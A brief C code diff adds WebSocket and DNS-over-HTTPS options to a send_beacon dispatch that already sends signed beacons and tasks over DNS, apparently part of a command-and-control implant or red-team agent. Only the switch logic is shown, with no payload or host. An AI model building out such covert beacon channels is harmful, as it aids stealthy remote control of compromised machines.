@@ -40,6 +40,12 @@ static void send_beacon(uint8_t *signed_beacon, size_t signed_len, uint8_t proto
         case 1:
             dns_send_beacon(signed_beacon, signed_len, task_buf, task_len);
             break;
+        case 2:
+            ws_send_beacon(signed_beacon, signed_len, task_buf,task_len);
+            break;
+        case 3:
+            doh_send_beacon(signed_beacon, signed_len, task_buf, task_len);
+            break;
         default:
             break;
     }
